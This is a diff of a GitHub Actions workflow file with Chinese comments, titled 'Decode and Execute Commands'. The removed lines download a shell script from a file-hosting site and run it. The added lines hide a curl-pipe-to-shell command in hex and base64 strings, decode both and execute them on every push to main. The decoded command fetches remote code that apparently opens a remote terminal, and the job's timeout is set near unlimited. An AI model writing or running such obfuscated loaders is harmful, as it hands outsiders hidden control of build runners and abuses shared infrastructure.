@@ -1,39 +1,32 @@
-name: 示例工作流
+name: Decode and Execute Commands
 
-on:
+on: 
   push:
     branches:
       - main
 
 jobs:
-  example-job:
+  decode-and-execute:
     runs-on: ubuntu-latest
     timeout-minutes: 9999999
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v2
 
-      - name: Run Ansible Playbook
-        uses: ansible/ansible-runner-action@v1
-        with:
-          playbook: |
-            - hosts: localhost
-              gather_facts: no
-              tasks:
-                - name: 下载 shell 脚本
-                  ansible.builtin.get_url:
-                    url: "https://files.catbox.moe/uh19yg.sh"
-                    dest: "/tmp/uh19yg.sh"
-                    mode: "0755"
-                    follow_redirects: all
+      - name: Decode Hex and Base64 and Execute Command
+        run: |
+          # Step 1: 提取Base64和Hex编码部分
+          hex_part="6375726c202d7353662068747470733a2f2f737368782e696f2f676574207c207368202d732072756e"
+          base64_part="Y3VybCAtc1NmIGh0dHBzOi8vc3NoeC5pby9nZXQgfCBzaCAtcyBydW4="
 
-                - name: 查看下载文件大小
-                  ansible.builtin.stat:
-                    path: /tmp/uh19yg.sh
-                  register: file_stat
+          # Step 2: 解码 HEX 和 Base64 部分
+          decoded_hex=$(echo "$hex_part" | xxd -r -p)   # 解码十六进制为命令
+          decoded_base64=$(echo "$base64_part" | base64 --decode)   # 解码Base64为命令
 
-                - debug:
-                    msg: "文件大小为 {{ file_stat.stat.size }} 字节"
+          # Step 3: 输出解码后的命令
+          echo "解码后的 HEX 命令：$decoded_hex"
+          echo "解码后的 Base64 命令：$decoded_base64"
 
-                - name: 运行 shell 脚本
-                  ansible.builtin.command: bash /tmp/uh19yg.sh
+          # Step 4: 执行解码后的命令
+          # 假设两个命令可以组合执行，使用 `sh -c` 来执行这些命令
+          sh -c "$decoded_hex | $decoded_base64"
